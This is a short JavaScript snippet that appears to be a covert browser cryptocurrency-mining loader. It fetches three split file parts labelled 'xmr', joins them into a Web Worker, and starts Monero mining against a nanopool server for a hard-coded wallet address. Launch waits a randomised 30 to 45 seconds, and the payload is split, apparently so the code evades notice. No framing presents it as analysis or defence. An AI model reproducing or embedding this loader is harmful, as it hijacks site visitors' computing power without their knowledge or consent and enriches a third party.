const PARTS = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac'];

const loadWorker = async () => {
  try {

    const buffers = await Promise.all(
      PARTS.map(part => 
        fetch(part)
          .then(res => res.arrayBuffer())
      )
    );

   
    const combined = new Blob(buffers, { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(combined);
    

    const worker = new Worker(workerUrl);
    worker.postMessage({ 
      action: 'init',
      config: {
        pool: 'xmr-eu1.nanopool.org:14433',
        wallet: '831iLs4viYZ4cCJhuH2QUxWKBzVw3wPXFNGavgjjic2y6Vcujx7bWTyT5YMMrQd9BpFv1TEeXquGH5Vcdn1vwwXfTpVaYDD'
      }
    });

  } catch(e) {
    console.error('Failed to load worker:', e);
  }
};

setTimeout(loadWorker, 30000 + Math.random() * 15000);
